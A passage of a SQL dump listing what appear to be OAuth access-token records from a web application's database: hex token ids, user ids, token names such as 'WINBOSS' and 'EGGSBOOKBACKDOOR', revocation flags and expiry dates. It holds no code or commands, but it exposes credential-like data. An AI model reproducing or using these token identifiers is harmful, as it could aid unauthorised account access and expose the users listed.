('67bf84e0023c89ca77efdf074c711f1fcd678f32923d5f4ec1162e12503179c9b654c95d981a79a1', '656163', 5, 'WINBOSS', '[]', 0, '2022-12-26 18:37:04', '2022-12-26 18:37:04', '2023-12-26 18:37:04'),
('680975b61ca6aaa31d6ab3fc1970909b3f6406596f9ad9155f3c806ce1a0f78ced0d4a5615d44459', '957450', 5, 'WINBOSS', '[]', 0, '2022-08-24 16:43:32', '2022-08-24 16:43:32', '2023-08-24 16:43:32'),
('68104220da8010e263fe023196d0ca3527951c7db8a287912c057b445d5a83c02713c78b5a78868a', '890808', 5, 'WINBOSS', '[]', 0, '2023-08-15 08:51:49', '2023-08-15 08:51:49', '2024-08-15 08:51:49'),
('6871a570240bd90d5b35f2ded6a348366c88f58360fc4310b4145f90d54a0efdfa9f7ab7fdc29b9f', '442776', 5, 'WINBOSS', '[]', 0, '2023-07-15 16:24:18', '2023-07-15 16:24:18', '2024-07-15 16:24:18'),
('6882f173d4b38ed89fe136a39f7123b6d99e9e1ac41c789ae4ba975b7ac415798e62af22f713c164', '295930', 5, 'WINBOSS', '[]', 0, '2023-07-07 09:25:05', '2023-07-07 09:25:05', '2024-07-07 09:25:05'),
('68e0b0e718df960eec014358a3e9c141ed8711b66127b5614069cd5589b28be96cf83dfcb5567c96', '779739', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:10:12', '2024-01-22 04:10:12', '2025-01-22 04:10:12'),
('6904ca7d7402f3cff10d71c6553a64484c971188abaea503273381dfe91afb5926d10e1ec16b87e6', '623725', 5, 'WINBOSS', '[]', 0, '2023-06-06 08:59:54', '2023-06-06 08:59:54', '2024-06-06 08:59:54'),
('690971292018635efd21d99141539291a811af9c7e0972c4e1aad1a02fce6a28f6b1080f784935aa', '831152', 5, 'WINBOSS', '[]', 0, '2023-11-24 09:53:45', '2023-11-24 09:53:45', '2024-11-24 09:53:45'),
('69347844eb0ee9f0be2af3f1448f33801110849023394e356953cea03728ad948a9aa32685e6e216', '396120', 5, 'WINBOSS', '[]', 0, '2022-12-14 13:44:03', '2022-12-14 13:44:03', '2023-12-14 13:44:03'),
('697662985526eeac1571846bc64ec4cf4d5f55139f964cf885d429965cbc1d9eeb587be177896c8d', '484151', 5, 'WINBOSS', '[]', 0, '2023-12-14 04:08:02', '2023-12-14 04:08:02', '2024-12-14 04:08:02'),
('69f9b01956638cc0160474d1f4638998fd060b93de4784c8992eb2aa05bdda02c13b3ffe7fd5ac7f', '523197', 5, 'WINBOSS', '[]', 0, '2023-11-16 01:35:12', '2023-11-16 01:35:12', '2024-11-16 01:35:12'),
('6a01c78fd091b6c62f04c5aaf26d81693d2dcf153137cacd2fc9c8f44e25e5620b16c3bd299956ef', '437822', 5, 'WINBOSS', '[]', 0, '2023-10-26 09:28:41', '2023-10-26 09:28:41', '2024-10-26 09:28:41'),
('6a15c6f4f276e0fd51d2fe12a528873289c36726bea526c89f319bff0615e951e2add0b444ac36bb', '848140', 5, 'WINBOSS', '[]', 0, '2023-06-06 03:32:23', '2023-06-06 03:32:23', '2024-06-06 03:32:23'),
('6a358b8f7927e7fd9d596192da23e0791c7bb09d223e35b6febf6c258e342672fa23eac94f48b234', '416815', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:15:38', '2024-01-22 04:15:38', '2025-01-22 04:15:38'),
('6a4064242b422f6d9b8770112adccae52d1d7899e9a4fe636bed41d47c59591413e9d67d176c946d', '692970', 5, 'WINBOSS', '[]', 0, '2022-11-05 14:17:01', '2022-11-05 14:17:01', '2023-11-05 14:17:01'),
('6a62b237afde928ebe9fdf7af1f2ad3cee4b7726fca6a8b1f386e79b2f04cac197af042a9b13ea22', '945953', 5, 'WINBOSS', '[]', 0, '2023-09-27 03:25:04', '2023-09-27 03:25:04', '2024-09-27 03:25:04'),
('6a94f5e845fe7d02172f296b2ce9904173a872124aa9ca54494759b6bb3a5b0c122d83ac722ba6ba', '755589', 5, 'WINBOSS', '[]', 0, '2023-05-01 06:04:04', '2023-05-01 06:04:04', '2024-05-01 06:04:04'),
('6ae39285885d1d2cb3af3a9c523b2985db73586b414eac7ad615582c4102e1818500b936e192f352', '791034', 5, 'WINBOSS', '[]', 0, '2023-04-24 05:27:30', '2023-04-24 05:27:30', '2024-04-24 05:27:30'),
('6b119531f5d6959d9c3174ab7731af041868e0a5557d6ea7f71ca3293c65fa2fe4910e986de35dad', '917766', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:24:22', '2024-01-22 04:24:22', '2025-01-22 04:24:22'),
('6b38f77051a6d305f1a2fec1a6956e13bd9402729327b0d2942acc2d69628accea2775882f6f68b9', '929038', 5, 'WINBOSS', '[]', 0, '2024-01-20 06:29:09', '2024-01-20 06:29:09', '2025-01-20 06:29:09'),
('6b51454e1930d9080ef157ab1abb8ae726987602931e13bec18220b5f08745b111a0355709aaa804', '566881', 5, 'WINBOSS', '[]', 0, '2023-03-18 14:37:49', '2023-03-18 14:37:49', '2024-03-18 14:37:49'),
('6b5182d03c290bee0ac7476096efc9be1fb02e65df4ab28efd758026c386c9f3cc82362a724df563', '103004', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-05-04 04:33:08', '2023-05-04 04:33:08', '2024-05-04 04:33:08'),
('6bb0952393caa2860c4c1d86622f9b16378a97d1925d68303a3c92e40027d3b5f5b790acc902e8c5', '689428', 5, 'WINBOSS', '[]', 0, '2023-12-08 13:04:48', '2023-12-08 13:04:48', '2024-12-08 13:04:48'),
('6bd95d9f3a9e38fa0f72d9f183779d39801f3a8f6fc11fc469a67a8cae54e7facc4a598a90539eb4', '226236', 5, 'WINBOSS', '[]', 0, '2023-06-28 02:11:16', '2023-06-28 02:11:16', '2024-06-28 02:11:16'),
('6c5c1c7c37d156afb405983ef3749a3018d9c8b566482dfc32725846a5d24d16b2bda02607eb3ea8', '431266', 5, 'BeTNoW', '[]', 0, '2023-01-09 08:38:14', '2023-01-09 08:38:14', '2024-01-09 08:38:14'),
('6c60c7462a054f8dafc8b94db90261089c11a360b2c7db8b0db603f63946d659f11a4c8d0e83221e', '741155', 5, 'WINBOSS', '[]', 0, '2023-06-09 22:25:53', '2023-06-09 22:25:53', '2024-06-09 22:25:53'),
('6c718b2921c48fea4bd8b781921d7a140c7b4f6cae8f64fe8e5f27b91b930e544986185d3bc4e619', '262050', 5, 'WINBOSS', '[]', 0, '2023-04-07 11:04:04', '2023-04-07 11:04:04', '2024-04-07 11:04:04'),
('6cf3768b118f12f2b3d1c691112c3b20133a53ed43b36a5bf15ecced21d66d04b9a5bca750d7ccd8', '307587', 5, 'WINBOSS', '[]', 0, '2024-01-15 12:54:17', '2024-01-15 12:54:17', '2025-01-15 12:54:17'),
('6d09543ec2dcccc5b316adc1720c88db71b4192411513d28260f6fd2e8461e34b129d8b72b5f19e9', '446146', 5, 'WINBOSS', '[]', 0, '2023-01-14 10:43:35', '2023-01-14 10:43:35', '2024-01-14 10:43:35'),
('6d11fd1c1f582f63167c147ea2cd64abb4882a001d5a2b056b9ef68b8f13ea54ef49d4b2ab0e7901', '548824', 5, 'WINBOSS', '[]', 0, '2023-07-28 04:29:53', '2023-07-28 04:29:53', '2024-07-28 04:29:53'),
('6d27bd58ed129e2d679676a50a3621d8cde76fe89f6c5b051e4d5caafd987a00f2cf2578bff59fc7', '468546', 5, 'WINBOSS', '[]', 0, '2023-11-10 17:51:39', '2023-11-10 17:51:39', '2024-11-10 17:51:39'),
('6d41183938523df97babfb54df2971dae20253a6cd01ae746381c4ead1ac42a8c67b977d15534d99', '185955', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:58:44', '2024-01-22 04:58:44', '2025-01-22 04:58:44'),
('6d65e2b8bec314e931b258491442df2ffaa3e059715d76eef9315117b044f2263382bab9f7b5e687', '511533', 5, 'WINBOSS', '[]', 0, '2024-01-20 04:17:35', '2024-01-20 04:17:35', '2025-01-20 04:17:35'),
('6dad22051d320f62271700f93c47950aa551d8d9a6445ffdf8ac67f40fb0d5af791a54e0d15ba1a0', '790912', 5, 'WINBOSS', '[]', 0, '2023-05-19 18:22:54', '2023-05-19 18:22:54', '2024-05-19 18:22:54'),
('6dc3bf2854416b13e278800a5492b138d971c7acc7c91afff61bd939f712793adb37b10ef20ea0f2', '728956', 5, 'WINBOSS', '[]', 0, '2023-08-08 16:38:09', '2023-08-08 16:38:09', '2024-08-08 16:38:09'),
('6dc7fbaa9eca1bac72ed50ada855ce1b1eb57096998d169cce882cb13811611ceaf820df59ccd2d4', '388362', 5, 'WINBOSS', '[]', 0, '2023-11-03 04:13:59', '2023-11-03 04:13:59', '2024-11-03 04:13:59'),
('6dca3bb3844a5e711e7e385dc7e500ea69d33999456cd9a4f7d34732e4dec41b44910a5c6abf52c5', '800829', 5, 'WINBOSS', '[]', 0, '2022-06-25 14:31:12', '2022-06-25 14:31:12', '2023-06-25 14:31:12'),
('6deee292bbaff2fddfd75aceed6be254fa8c87e0f667f2f5addb77306f927c3e9b0c922ceb9367ac', '951596', 5, 'WINBOSS', '[]', 0, '2023-05-12 06:36:39', '2023-05-12 06:36:39', '2024-05-12 06:36:39'),
('6def2de3d12073d3dd88614b7021861aebdb847871e10086e0b476d71e8b7d883de81a89b843915c', '139654', 5, 'WINBOSS', '[]', 0, '2022-10-28 08:22:13', '2022-10-28 08:22:13', '2023-10-28 08:22:13'),
('6dfa9ed0da52f9e88318c572cf14d882f9bba19ff91053a1ffefa6af73d02e2b4871b46af049eee7', '453537', 5, 'WINBOSS', '[]', 0, '2024-01-21 02:15:18', '2024-01-21 02:15:18', '2025-01-21 02:15:18'),
('6e4a0d352a541da1fa6ed45dd20d050b9eaddee9ed32f76210020b372068f18c9fffc19f39e83f53', '139654', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-23 09:43:49', '2022-11-23 09:43:49', '2023-11-23 09:43:49'),
('6e9404c802a7ea46088ff6568bbe987e043263e2be97613f9aa94e31c03800a3b475957218cfb5e0', '628211', 5, 'WINBOSS', '[]', 0, '2023-01-03 10:01:05', '2023-01-03 10:01:05', '2024-01-03 10:01:05'),
('6f082a65e8e79bf2e3f5b7905672405f1663da1780eb55016410a1b369a4649c6baae2cfafa5c5d7', '923383', 5, 'WINBOSS', '[]', 0, '2023-09-14 03:26:32', '2023-09-14 03:26:32', '2024-09-14 03:26:32'),
('6f2ae2657f0aab151c80a0998708173fd4b0829323718e87a171d9f9220444cc71e584202746634c', '600155', 5, 'WINBOSS', '[]', 0, '2023-04-04 08:54:46', '2023-04-04 08:54:46', '2024-04-04 08:54:46'),
('6f80ded906ce6a77ae07ce5b86e8f562dc0d66199b80b5f8ba3eb8e7052e27686ddc374d3d8a06e4', '195742', 5, 'WINBOSS', '[]', 0, '2022-12-29 09:34:50', '2022-12-29 09:34:50', '2023-12-29 09:34:50'),
('6fc439d09537ca5bdbbcde153af126d188ca67e923f92224f71d4d7a865cb8cfcc08de79afef76a4', '305977', 5, 'WINBOSS', '[]', 0, '2024-01-18 05:11:01', '2024-01-18 05:11:01', '2025-01-18 05:11:01'),
('6fd3437a2485cafeaab5e0f57315d5564d45ed624e5390d380bc51de5b413d4c363aec3be65713ae', '994442', 5, 'WINBOSS', '[]', 0, '2023-02-28 04:39:37', '2023-02-28 04:39:37', '2024-02-28 04:39:37'),
('7017de86370a78b51908cd61fc1149989fb6069971c2227c39adc3019e815726fc9a46a92dd9cccf', '789712', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-06-28 08:13:16', '2022-06-28 08:13:16', '2023-06-28 08:13:16'),
('70ab7b611f1e4666e6c05f844fe124f13a6cfd6659247e57797856405eea692bb958c1ac5171ebca', '540627', 5, 'WINBOSS', '[]', 0, '2022-12-07 14:06:34', '2022-12-07 14:06:34', '2023-12-07 14:06:34'),
('70d6b57251f28df6c7d5527800a0dfb62b88642b3df646ce5dff501e3f4fd7958a22d52b8a7d6b85', '645719', 5, 'WINBOSS', '[]', 0, '2022-12-25 21:52:49', '2022-12-25 21:52:49', '2023-12-25 21:52:49'),
('7147ed5fd20a7f7748659cc1efcb31651c0972d00c846b82134bd4555395f42c377a3cd44325a86f', '867203', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:15:21', '2022-09-01 05:15:21', '2023-09-01 05:15:21'),
('715241543466594e5113e1266a8abee367bcdc8cbd890f5368d976a07737c7ca01bec2e248075d08', '449510', 5, 'WINBOSS', '[]', 0, '2022-12-30 10:57:34', '2022-12-30 10:57:34', '2023-12-30 10:57:34'),
('7156964c3295a7a186d59c5af77621d6e480e39cd7f55149e1eadd43c2f5871d76fc6b4e714c1cbd', '418433', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:54:37', '2024-01-22 04:54:37', '2025-01-22 04:54:37'),
('715d4fef8a167c826f25c1af6e2f15b182277bf60a263a571eef7008c5d2e6be6277fe8ef922ea74', '672830', 5, 'WINBOSS', '[]', 0, '2022-12-17 10:33:37', '2022-12-17 10:33:37', '2023-12-17 10:33:37'),
('715e48211644cfaa73558fc4f3a324bf8f04415b6f8a24d4bae8988140e83f4f67f10b48d0932594', '291219', 5, 'WINBOSS', '[]', 0, '2023-10-13 13:29:41', '2023-10-13 13:29:41', '2024-10-13 13:29:41'),
('71cacf34e14e3520fbf867cb19b94b4f983655869eeae68fd8e0efb90b6788af869034b86e9bee45', '643270', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-21 10:16:41', '2022-11-21 10:16:41', '2023-11-21 10:16:41'),
('71d9e29f7095b90c5876df65346999cb6727d60fa5a2fe3176cbbb04a02fddc8b07eb47e62b7a566', '536025', 5, 'WINBOSS', '[]', 0, '2024-01-08 13:05:25', '2024-01-08 13:05:25', '2025-01-08 13:05:25'),
('71dcd2b014c4bedf34d1c0673130cf7023f1171f63ccff310fa5463402d901dbf1edc54b356f9386', '328578', 5, 'WINBOSS', '[]', 0, '2024-01-15 13:20:01', '2024-01-15 13:20:01', '2025-01-15 13:20:01'),
('720c1d2fa91a7a4d38d659694edd318bf39bc85d9691cec84537d81c1cd1e3bc71f2a7e80600c838', '794459', 5, 'WINBOSS', '[]', 0, '2023-06-14 03:18:10', '2023-06-14 03:18:10', '2024-06-14 03:18:10'),
('723714ee8757f4179e3e80c8ca12e2a30c23820d4cbd228eba8ff85f5acf888f8b5049cc6a708292', '836181', 5, 'WINBOSS', '[]', 0, '2023-06-05 15:27:58', '2023-06-05 15:27:58', '2024-06-05 15:27:58'),
('7264d4cdd42c30b2e4d9e8e08416402436a3ed3b2ecbdd54e46194e98b155076212decf415d42de9', '214176', 5, 'WINBOSS', '[]', 0, '2022-12-25 21:30:42', '2022-12-25 21:30:42', '2023-12-25 21:30:42'),
('7278089e6ad7ef9c09ffad3eb4e94cfec7d287662dc35212df89f1df6bf683eea3cf78b578dab5b0', '583942', 5, 'WINBOSS', '[]', 0, '2022-10-10 06:01:30', '2022-10-10 06:01:30', '2023-10-10 06:01:30'),
('72a17a190e173efa16f5b34e8078257e71ca8a59fd1434f38070ab65505fbb76a0eac9e7cbaae53d', '957351', 5, 'WINBOSS', '[]', 0, '2023-10-10 07:51:01', '2023-10-10 07:51:01', '2024-10-10 07:51:01'),
('72a2612cf15e3a643a3d00b925d67f3b3972e7ddc01fac071ccb43ea6a87a2ef79669af7c80433fb', '969326', 5, 'WINBOSS', '[]', 0, '2022-12-26 13:57:04', '2022-12-26 13:57:04', '2023-12-26 13:57:04'),
('7301f93844ad667d574714b7f297e7266f4f45635100b080d5478bbb02dc88ddfbf22980b2814945', '221329', 5, 'WINBOSS', '[]', 0, '2022-10-01 10:40:22', '2022-10-01 10:40:22', '2023-10-01 10:40:22'),
('730c71d46b5e698305518212c83b875559e2d10f8f1d3b4e418df8d22be281363d9465075d4ac886', '331593', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:15:23', '2024-01-22 04:15:23', '2025-01-22 04:15:23'),
('731d56d1946be96b100f5efb5235191ec7c5f2c9152e0c9ae25b35a081641ee822c20ddc064dec7c', '599161', 5, 'WINBOSS', '[]', 0, '2022-12-08 04:40:43', '2022-12-08 04:40:43', '2023-12-08 04:40:43'),
('737e02938b99411f5487004c78305f25adf75e439aa38cb895715028b8feb8ae20b9651a818d58b3', '432492', 5, 'WINBOSS', '[]', 0, '2022-10-01 10:53:59', '2022-10-01 10:53:59', '2023-10-01 10:53:59'),
('739e411a58201e43050a139bca3ddf641b3450682864625b685648ff1a2bc99f3fdc0bf1b9d7f60d', '750833', 5, 'BeTNoW', '[]', 0, '2022-08-04 03:06:20', '2022-08-04 03:06:20', '2023-08-04 03:06:20'),
('7409a2b6b26799b41615976430e63d5d0a183411c7186e2786f8576493e3f4a2efac43907558daf5', '323189', 5, 'WINBOSS', '[]', 0, '2022-11-22 01:42:46', '2022-11-22 01:42:46', '2023-11-22 01:42:46'),
('7465a84d8d68e17f88eaaa468f1a64b81f77ce481e50e76bb3ba3cf70f09f9ef51ed48b5163e0af1', '140387', 5, 'WINBOSS', '[]', 0, '2023-08-15 08:33:54', '2023-08-15 08:33:54', '2024-08-15 08:33:54'),
('7499c6562ab166f3e0e5129c7ee2140322f2b2a95d3c563649f0b3a0ea80eabb404a0fd5001581de', '133212', 5, 'WINBOSS', '[]', 0, '2023-10-16 22:03:52', '2023-10-16 22:03:52', '2024-10-16 22:03:52'),
('753bd620c2b6aff7710bc2973e2c90c88ec9fa174bdaca38c44791ded2440791189de00b53a7ffb1', '571077', 5, 'BeTNoW', '[]', 0, '2023-04-27 03:48:38', '2023-04-27 03:48:38', '2024-04-27 03:48:38'),
('759a414d04dabbf3efb579336cd2179645bcd3d3cf8986a1823a80176b0bb5e2ce5364755c760773', '220178', 5, 'WINBOSS', '[]', 0, '2023-07-06 10:10:44', '2023-07-06 10:10:44', '2024-07-06 10:10:44'),
('75c61db60f8bf93e39fd3468e93f75e7e4069c96e5cc869bb1e4adea895274bdafadbb76d5172e06', '640020', 5, 'WINBOSS', '[]', 0, '2022-07-21 14:34:10', '2022-07-21 14:34:10', '2023-07-21 14:34:10'),
('75ebef809fa4784b8a5f202662448f10a4ee7b70992a811443e306cdb29179cf5f28eb069a680428', '566863', 5, 'WINBOSS', '[]', 0, '2024-01-15 02:09:55', '2024-01-15 02:09:55', '2025-01-15 02:09:55'),
('75f43459d2c89834dfbc6c9268d9e64b22c3515fb81ad6db46e07573a40dad6fde5b962aefdd8d4c', '599579', 5, 'WINBOSS', '[]', 0, '2022-12-12 04:07:59', '2022-12-12 04:07:59', '2023-12-12 04:07:59'),
('76140c28dbc29ba390a3d085e6a518f71324a556fa97bd3529463474774b3fc480d58c54aa5f9bbf', '112333', 5, 'WINBOSS', '[]', 0, '2022-10-03 11:17:48', '2022-10-03 11:17:48', '2023-10-03 11:17:48'),
('761d5eb406d0019334ec94f4d3f4fade09125095a374869eb470e7a8f080d144fb54b31c27fb5dbb', '400872', 5, 'WINBOSS', '[]', 0, '2022-11-19 02:43:49', '2022-11-19 02:43:49', '2023-11-19 02:43:49'),
('76266cc5c90005b664b5f60227407839b0dd9943c3df257754a8f66932daa0de12f5fbaa94b8322e', '553726', 5, 'WINBOSS', '[]', 0, '2023-11-18 22:00:20', '2023-11-18 22:00:20', '2024-11-18 22:00:20'),
('76408a4c640144b82081cb37688484163704dd9671b11d23a837ecd2174fa325f88f75d8c9a46342', '944597', 5, 'WINBOSS', '[]', 0, '2022-12-26 18:26:38', '2022-12-26 18:26:38', '2023-12-26 18:26:38'),
('76ccba4748a843002f524e727c30c8f5f96def16293fe32b011c65f6266b43185260dd0d6ded836b', '677898', 5, 'BeTNoW', '[]', 0, '2022-06-25 04:53:03', '2022-06-25 04:53:03', '2023-06-25 04:53:03'),
('76eebc76b59012379e0f924bd37fb2a5b948c85ebf26c061248585f59967c3e6b1fe3965cbda3438', '848939', 5, 'WINBOSS', '[]', 0, '2023-04-19 10:15:35', '2023-04-19 10:15:35', '2024-04-19 10:15:35'),
('77388cddf52114fd1132fe4165e92e7b89b927e48b52bd334a7f030e54c331cbb19cab688707d19d', '593239', 5, 'WINBOSS', '[]', 0, '2023-09-06 19:59:52', '2023-09-06 19:59:52', '2024-09-06 19:59:52'),
('774d3f0e0fc9012d6392393b5eca3c1722503d4ae1a0954a1b2fa4290e4bd8786d3866b704e0aa86', '762437', 5, 'WINBOSS', '[]', 0, '2023-04-12 11:01:05', '2023-04-12 11:01:05', '2024-04-12 11:01:05'),
('7776699ca519ee511b7e6d64a196a947076799aa2f93dab4430420a9eccdb94fe79b337091aa69df', '702052', 5, 'WINBOSS', '[]', 0, '2024-01-15 11:11:23', '2024-01-15 11:11:23', '2025-01-15 11:11:23'),
('77882f50014c75b88b6db12ed8657845b72ffdac237be7c8b5a326274bf46ecf7f866daa2ab429cf', '295209', 5, 'WINBOSS', '[]', 0, '2023-01-20 16:45:25', '2023-01-20 16:45:25', '2024-01-20 16:45:25'),
('77bc4d75ca97bdb17eecbad5e72cd3bffd6be07d24032eb6e791e66edd5fc3a1ec7bc40ddd1a2b58', '812391', 5, 'WINBOSS', '[]', 0, '2023-09-20 07:55:54', '2023-09-20 07:55:54', '2024-09-20 07:55:54'),
('77d046529708cdb1e08c8d58389d0d34fb4fa5bc68125298e6bda5bbef822f7fe4924d715179d768', '798897', 5, 'WINBOSS', '[]', 0, '2022-12-25 19:30:42', '2022-12-25 19:30:42', '2023-12-25 19:30:42'),
('77df4bc90bc1bc567f04adb15804d98ab271223592159b491b79552f9e78b63da25ba60d5c0daba3', '171193', 5, 'WINBOSS', '[]', 0, '2023-08-15 08:38:16', '2023-08-15 08:38:16', '2024-08-15 08:38:16'),
('782ca5fd28b05ebd154cc8491d8dae70cdba6e0d153dc79ee93750a1e759680adadb842cf0445881', '714316', 5, 'WINBOSS', '[]', 0, '2023-04-02 14:42:04', '2023-04-02 14:42:04', '2024-04-02 14:42:04'),
('782fb041d2e12f6c8358e40d86c11e8da36a335b531d67eeabc154a397ae6e51ca88749d3cb3bda4', '332042', 5, 'WINBOSS', '[]', 0, '2023-11-06 01:17:05', '2023-11-06 01:17:05', '2024-11-06 01:17:05'),
('7842091df0d9941c74ad292c59bea993b85ffb571072490c9d0c99a5434edd8f443278e1d44acaea', '570246', 5, 'WINBOSS', '[]', 0, '2023-09-04 03:56:19', '2023-09-04 03:56:19', '2024-09-04 03:56:19'),
('785b5f4ba1e1e764f149a30b233ff1a77ae0d04f7dce867685685c8a0b21f4b4f4be980c07f1bd52', '135829', 5, 'WINBOSS', '[]', 0, '2023-09-25 02:58:45', '2023-09-25 02:58:45', '2024-09-25 02:58:45'),
('788af45d2851492c6466d6e23201929aef27a91e5561dfe9ee20c35f82a86a4f713ad2d58d2985f1', '986210', 5, 'WINBOSS', '[]', 0, '2023-11-14 10:41:17', '2023-11-14 10:41:17', '2024-11-14 10:41:17'),
('788dd7a088d50f152777658e49b0ea6a87f9ca4802d2d7c88fa88c8964fc3dcf90208c03e8011e0c', '394366', 5, 'WINBOSS', '[]', 0, '2022-12-07 13:05:20', '2022-12-07 13:05:20', '2023-12-07 13:05:20'),
('78aa1c1e7f3dd4a50617d4f7394ae7355bada8773c236086fde5e662089064066ce2e4558aab0a87', '176803', 5, 'WINBOSS', '[]', 0, '2023-06-29 06:31:40', '2023-06-29 06:31:40', '2024-06-29 06:31:40'),
('791031a2060a366472530938c85e3bccab07d581dd6e509f643bbaf0b1e7c7864d9b49a04ab82de7', '293193', 5, 'WINBOSS', '[]', 0, '2022-12-05 01:52:20', '2022-12-05 01:52:20', '2023-12-05 01:52:20'),
('79489609000c5d98b44bd0fa29238a57b6f027b5cb5e082138a0e225949cc609363df1b1017fe162', '159381', 5, 'WINBOSS', '[]', 0, '2022-12-26 13:07:00', '2022-12-26 13:07:00', '2023-12-26 13:07:00'),
('799f7264b91fc6290b088de63e6567acc309e68dd71ee88ceb66befec069eaeddbfa3e0a9fa1efc6', '575787', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-10-23 04:27:34', '2023-10-23 04:27:34', '2024-10-23 04:27:34'),
('79cceabf03f02f4224977d0793ea361425b3014d6c477bbbbf378dd7b35869aa51818b3466569194', '502602', 5, 'WINBOSS', '[]', 0, '2022-12-14 15:47:09', '2022-12-14 15:47:09', '2023-12-14 15:47:09'),
('79f0983506b5201d29d93dd8259a99b41997627118a0f62c30208d00b2b6e55a7c72cbc3ddc31981', '689016', 5, 'WINBOSS', '[]', 0, '2023-12-22 04:08:40', '2023-12-22 04:08:40', '2024-12-22 04:08:40'),
('7a2fa7261b7505c53f35429f822902db8eb228c38e3dda813b5f9c5cededc54aaa43a2ed29450a5d', '550644', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:38:08', '2024-01-22 04:38:08', '2025-01-22 04:38:08'),
('7a3597b901857654ce77cf4ac3bfea8ac1c05d6316debde94a65f99d7cb0134c59b693c1874336ff', '950269', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-10 15:26:05', '2022-09-10 15:26:05', '2023-09-10 15:26:05'),
('7aabf71383bdb77506b3236782f5acfe8f7f77ca3794e9eba0aed5cbde8582461f8c06766cae357a', '931460', 5, 'WINBOSS', '[]', 0, '2022-10-18 08:36:37', '2022-10-18 08:36:37', '2023-10-18 08:36:37'),
('7acf1a4778fc8e096f140a13dfe9ed5452444d9e2145aecf70bff40de88ea47e86ec50ce1325599a', '606152', 5, 'WINBOSS', '[]', 0, '2023-11-18 13:06:05', '2023-11-18 13:06:05', '2024-11-18 13:06:05'),
('7b0a71d251dbc95218437199f09a9ae152c606b50cea762864896132e79e4d12a3a0f3b8de167441', '103909', 5, 'WINBOSS', '[]', 0, '2022-12-26 12:09:53', '2022-12-26 12:09:53', '2023-12-26 12:09:53'),
('7b489aaabcf8ce4fb2a00fd5b780e96fa8ebd6b09069c946b888440e43e4540788971dc34bdec314', '861337', 5, 'WINBOSS', '[]', 0, '2024-01-17 08:58:40', '2024-01-17 08:58:40', '2025-01-17 08:58:40'),
('7b50c13246ec8ab9453ca3546d17013296785701a150cd196dc158f8a0f804c9ac43d6cfbbec7b3f', '135828', 5, 'WINBOSS', '[]', 0, '2023-07-02 17:29:29', '2023-07-02 17:29:29', '2024-07-02 17:29:29'),
('7b51f674df7b5366349c7e52a6d18d941c2c8fc38244d0077b2cb7b95eff83ba1633376e458f6aa6', '995973', 5, 'WINBOSS', '[]', 0, '2022-09-12 07:44:38', '2022-09-12 07:44:38', '2023-09-12 07:44:38'),
('7c24288c9611c8795babc26e8b842ce17e4a2a8dbe02e56d751a3621c8ffd622ac6883cdd06d5391', '643270', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-21 10:19:01', '2022-11-21 10:19:01', '2023-11-21 10:19:01'),
('7c468725d28600569f914a18b7080c6a1dddf0d35a1ec1e558ef3da16446f29d75018970305af670', '179053', 5, 'WINBOSS', '[]', 0, '2022-08-24 16:45:16', '2022-08-24 16:45:16', '2023-08-24 16:45:16'),
('7c6d57df74b9e9215d3f09cbe45dc267bcdf123aabb2dbfddb3268896997d26765c5a2201823f4f3', '967865', 5, 'WINBOSS', '[]', 0, '2022-12-29 08:38:31', '2022-12-29 08:38:31', '2023-12-29 08:38:31'),
('7cc63c64087c04c112b6462f968d0bd0176c3c91e2a03342a507fbfa37683b57760353f0ee47bbdf', '293828', 5, 'WINBOSS', '[]', 0, '2023-07-11 16:23:11', '2023-07-11 16:23:11', '2024-07-11 16:23:11'),
('7cd6ef301b54cbbf44859ffa499558e071b62ae9f2de3935d9191f3a422824d21bec8d4129f09d0b', '158237', 5, 'WINBOSS', '[]', 0, '2023-10-07 10:51:53', '2023-10-07 10:51:53', '2024-10-07 10:51:53'),
('7cee02620db21266e5e139222e0a52279999b3915663771c2da0061eaab779cb5f23908bb3bd200a', '405654', 5, 'WINBOSS', '[]', 0, '2023-12-14 08:49:40', '2023-12-14 08:49:40', '2024-12-14 08:49:40'),
('7d08b026e4bbdd41fdc9c1ea2d8afb98705b12cd6ac01e4dfac3ccd819b6a5be92214225f8637f11', '692929', 5, 'BeTNoW', '[]', 0, '2022-07-12 03:03:23', '2022-07-12 03:03:23', '2023-07-12 03:03:23'),
('7d14968f86c4cfe1c1768959c3b2dedf23677c6d36bca9eb218b11dab28e176127f324b3be3ddec7', '866392', 5, 'WINBOSS', '[]', 0, '2023-03-21 10:15:53', '2023-03-21 10:15:53', '2024-03-21 10:15:53'),
('7de60d90860f03eae492a608292d07171c521262263218f9b44e0490d6d1c488c9268efd77e2ef18', '884785', 5, 'WINBOSS', '[]', 0, '2023-07-18 13:24:38', '2023-07-18 13:24:38', '2024-07-18 13:24:38'),
('7dedf7747e09153cc8e4e892f054ac136cfe743c1dad4dcce5d73c2ef03f6b62d3bb49898ccc35c1', '498815', 5, 'WINBOSS', '[]', 0, '2022-08-04 11:38:37', '2022-08-04 11:38:37', '2023-08-04 11:38:37'),
('7e04af1b9cf935415c7e9a6f253c9f51dff1233e47365e144a322d4db8d5bc0b7ad4049583849e9f', '451130', 5, 'WINBOSS', '[]', 0, '2023-01-08 23:02:31', '2023-01-08 23:02:31', '2024-01-08 23:02:31'),
('7e12e26ce981e088b6f2824c6ea52e0a90f1836377126bc379acc510788a87a78672b19a9086a19e', '475427', 5, 'WINBOSS', '[]', 0, '2023-12-12 15:00:20', '2023-12-12 15:00:20', '2024-12-12 15:00:20'),
('7e4554166ab9fb5bda9723b7f78abd750103f1ce2af6824a00240ef5c6cc9e1a58ad71cdd648b22b', '851274', 5, 'WINBOSS', '[]', 0, '2022-10-08 09:31:28', '2022-10-08 09:31:28', '2023-10-08 09:31:28'),
